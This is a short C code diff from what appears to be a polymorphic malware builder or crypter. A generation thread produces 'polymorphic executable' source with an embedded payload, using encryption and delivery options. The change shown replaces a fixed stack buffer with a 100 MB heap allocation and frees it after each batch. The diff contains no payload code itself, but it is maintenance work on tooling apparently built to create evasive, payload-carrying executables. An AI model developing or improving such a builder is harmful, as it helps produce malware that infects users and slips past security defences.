@@ -719,8 +719,15 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         PostMessage(hMainWindow, WM_USER + 1, MAKEWPARAM(batch, batchCount), 0);
         
         // Generate polymorphic source code with actual payload embedding
-        char sourceCode[65536]; // Larger buffer for embedded payloads
-        generatePolymorphicExecutableWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputPath);
+        // Use a large dynamically allocated buffer (100 MB) to ensure sprintf_s never overflows
+        const size_t sourceBufferSize = 100 * 1024 * 1024; // 100 MB
+        char* sourceCode = (char*)malloc(sourceBufferSize);
+        if (!sourceCode) {
+            // Memory allocation failed – notify UI and abort generation gracefully
+            PostMessage(hMainWindow, WM_USER + 5, 0, 0);
+            break;
+        }
+        generatePolymorphicExecutableWithPayload(sourceCode, sourceBufferSize, encType, delType, inputPath);
         
         // Create temporary source file
         char tempSource[128];
@@ -793,6 +800,9 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 PostMessage(hMainWindow, WM_USER + 3, 0, 0);
             }
         }
+
+        // Release the large source buffer after each batch iteration
+        free(sourceCode);
         
         // Delay between batches
         if (batch < batchCount - 1) {
